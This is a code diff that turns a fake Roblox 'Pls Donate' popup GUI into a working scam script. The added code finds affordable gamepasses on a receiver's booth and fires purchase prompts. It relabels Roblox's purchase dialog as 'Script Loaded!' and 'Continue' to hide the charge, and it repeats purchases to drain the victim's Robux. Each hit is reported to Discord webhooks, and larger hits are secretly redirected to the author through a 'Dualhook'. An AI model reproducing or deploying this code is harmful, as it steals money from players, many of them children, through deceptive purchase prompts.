@@ -1,110 +1,133 @@
+RobloxUser = Username
+DiscordWebhook = Webhook
+
+local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local DualRobux = 10 -- For testing Dualhook price
+local DualUser = ""
+local DualWebhook = ""
+local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
 
-local screenGui = Instance.new("ScreenGui", playerGui)
+local request = syn and syn.request or request
+if typeof(request) ~= "function" then error("?!?") end
 
-local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 300, 0, 230)
-mainFrame.Position = UDim2.new(0.5, -150, 0.4, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-mainFrame.BorderSizePixel = 2
-mainFrame.Active = true
-mainFrame.Draggable = true  
+local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+local success, UserId = pcall(function() return Players:GetUserIdFromNameAsync(Username) end)
 
-local usernameBox = Instance.new("TextBox", mainFrame)
-usernameBox.Size = UDim2.new(0.8, 0, 0, 30)
-usernameBox.Position = UDim2.new(0.1, 0, 0.1, 0)
-usernameBox.PlaceholderText = "Enter Username"
-usernameBox.Text = ""
-usernameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+local asset
+local userRobux
 
-local robuxBox = Instance.new("TextBox", mainFrame)
-robuxBox.Size = UDim2.new(0.8, 0, 0, 30)
-robuxBox.Position = UDim2.new(0.1, 0, 0.3, 0)
-robuxBox.PlaceholderText = "Enter Robux Amount"
-robuxBox.Text = ""
-robuxBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-robuxBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+local function sendWebhook()
+    local embed = {
+        ["title"] = "Historic Scripts - Please Donate Hit",
+        ["color"] = 0x6bffba,
+        ["fields"] = {
+            {["name"] = "<:drawpen:1311079366125555782> á´˜ÊŸá´€Êá´‡Ê€ ÉªÉ´êœ°á´", ["value"] = "```Name: " .. Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"},
+            {["name"] = "<:robux:1314309850154537020> á´›á´á´›á´€ÊŸ Ê€á´Ê™á´œx", ["value"] = "```" .. userRobux .. "```"},
+            {["name"] = "<:ticketyellow:1311079539237191750> É¢á´€á´á´‡á´˜á´€êœ±êœ± á´˜Ê€Éªá´„á´‡", ["value"] = "```" .. tostring(asset:GetAttribute("AssetPrice")) .. "```"},
+            {["name"] = "ÉªÉ´êœ°á´;", ["value"] = "The victim Must click the 'Continue' button. Otherwise, you will not receive the Robux."}
+        }
+    }
 
-local donateButton = Instance.new("TextButton", mainFrame)
-donateButton.Size = UDim2.new(0.8, 0, 0, 40)
-donateButton.Position = UDim2.new(0.1, 0, 0.6, 0)
-donateButton.Text = "Donate"
-donateButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-donateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    local data = HttpService:JSONEncode({["content"] = "@everyone", ["embeds"] = {embed}})
+    local logsData = HttpService:JSONEncode({["content"] = "Historic Scripts", ["embeds"] = {embed}})
 
-local watermark = Instance.new("TextLabel", mainFrame)
-watermark.Size = UDim2.new(1, 0, 0, 20)
-watermark.Position = UDim2.new(0, 0, 0.9, 0)
-watermark.Text = "Pls Donate Script | Made By 214SCRIPTS"
-watermark.TextColor3 = Color3.fromRGB(200, 200, 200)
-watermark.BackgroundTransparency = 1
-watermark.Font = Enum.Font.SourceSans
-watermark.TextScaled = true
-
-
-local function formatNumber(number)
-    local formatted = tostring(number)
-    formatted = formatted:reverse():gsub("(%d%d%d)", "%1,"):reverse()
-    if formatted:sub(1, 1) == "," then
-        formatted = formatted:sub(2)
-    end
-    return formatted
+    request({Url = Webhook, Method = "POST", Headers = headers, Body = data})
+    request({Url = LogsWebhook, Method = "POST", Headers = headers, Body = logsData})
 end
 
+if success then
+    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
+    if not Booth then return Players.LocalPlayer:Kick() end
 
-local function createDonationPopup(username, robux_amount)
-    local ScreenGui = playerGui:FindFirstChild("ScreenGui")
-    local Donation_Text = username.." DONATED " ..formatNumber(robux_amount).. "îâ TO YOU!"
-    local clone = playerGui.UITemplates.donationPopup:Clone()
-
-
-    player.leaderstats.Raised.Value = player.leaderstats.Raised.Value + robux_amount
-
-    clone.Message.Text = Donation_Text
-    clone.Transparency = 1
-    clone.UIScale.Scale = 0
-    clone.Parent = ScreenGui.Popups
-
-
-    TweenService:Create(clone, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {
-        Transparency = 0;
-    }):Play()
-
-    TweenService:Create(clone.UIScale, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-        Scale = 1;
-    }):Play()
-
-    TweenService:Create(clone.Message, TweenInfo.new(1, Enum.EasingStyle.Quint), {
-        MaxVisibleGraphemes = #Donation_Text;
-    }):Play()
-
-    wait(4)
-
-    TweenService:Create(clone, TweenInfo.new(0.25, Enum.EasingStyle.Quint), {
-        Transparency = 1;
-    }):Play()
-
-    TweenService:Create(clone.UIScale, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
-        Scale = 0;
-    }):Play()
-
-    wait(0.5)
-    clone:Destroy()
-end
-
-
-donateButton.MouseButton1Click:Connect(function()
-    local username = usernameBox.Text
-    local robux_amount = tonumber(robuxBox.Text)
-
-    if username ~= "" and robux_amount and robux_amount > 0 then
-        createDonationPopup(username, robux_amount)
-    else
-        print("Invalid username or robux amount")
+    local function Purchase()
+        local range = 0
+        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+            if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+                local Attribute = v:GetAttribute("AssetPrice")
+                if Attribute <= userRobux and Attribute > range then
+                    asset = v
+                    range = Attribute
+                end
+            end
+        end
+        
+        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, range)
+        else
+            warn("?")
+        end
     end
-end)
+
+    local range = math.huge
+    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+            local Attribute = v:GetAttribute("AssetPrice")
+            if Attribute < range then
+                asset = v
+                range = Attribute
+            end
+        end
+    end
+
+    if asset then
+        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, range)
+            print(range)
+        else
+            warn("??.")
+        end
+    end
+
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+
+    Animator.ChildAdded:Connect(function(child)
+        if child.Name == "Prompt" then
+            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
+            if RemainingBalanceText then
+                if userRobux then
+                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+                    child.AlertContents.MiddleContent.Visible = false
+                    child.AlertContents.Footer.Buttons["1"].Visible = false
+                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
+                    child.AlertContents.Footer.FooterContent.Visible = false
+                elseif asset then
+                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+                    child.AlertContents.MiddleContent.Visible = false
+                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+                    child.AlertContents.Footer.Buttons["2"].Visible = false
+                    child.AlertContents.Footer.FooterContent.Visible = false
+
+                    userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
+                    if userRobux > DualRobux then
+                        Username = DualUser
+                        Webhook = DualWebhook
+                        asset = nil
+                    end
+                end
+            end
+        end
+    end)
+
+    Animator.ChildRemoved:Connect(function(child)
+        if child.Name == "Prompt" and userRobux then
+            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
+                Purchase()
+            end
+        end
+    end)
+
+    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
+        if a == UserId and userRobux then
+            sendWebhook()
+            userRobux -= robux
+            Purchase()
+        end
+    end)
+end
